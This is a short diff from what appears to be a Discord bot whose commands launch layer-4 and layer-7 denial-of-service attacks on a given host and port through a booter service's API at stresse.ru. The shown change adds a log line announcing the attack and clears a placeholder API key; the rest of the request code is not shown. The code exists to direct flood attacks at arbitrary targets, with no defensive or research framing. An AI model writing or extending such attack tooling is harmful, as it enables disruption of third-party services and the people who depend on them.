@@ -241,7 +241,8 @@ async def stresse_layer4(ctx, api_key, host, port, time, method):
 
 @bot.command()
 async def launch_layer7_attack(ctx, host, port, time, method, postdata=None, cookie=None, referer=None, useragent=None, req=None, delay=None, con=None):
-    api_key = 'YOUR_API_KEY'  # Replace with your actual API key
+    print(f'[LOGS] Running Layer 7 attack on {host} {port} | Method: {method} | Time: {time}')
+    api_key = ''  # Replace with your actual API key
 
     api_url = "https://stresse.ru/api/api.php"
     params = {
